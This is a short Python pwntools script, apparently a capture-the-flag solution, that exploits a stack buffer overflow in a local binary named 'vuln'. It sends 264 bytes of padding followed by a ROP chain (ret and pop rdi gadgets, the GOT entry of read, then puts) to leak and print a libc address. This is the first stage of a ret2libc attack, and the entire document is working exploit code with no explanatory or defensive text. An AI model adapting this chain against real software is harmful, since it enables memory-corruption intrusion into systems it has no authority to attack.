from pwn import *

e = ELF('./vuln')
p = process('./vuln')

ret_addr = 0x0040101a
pop_rdi_addr = 0x00401223

payload = 'A'*264
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(e.got['read'])
payload += p64(e.symbols['puts'])

p.sendline(payload)
p.recvline()
p.recvline()
ret = u64(p.recvline()[:6] + '\x00\x00')
print hex(ret)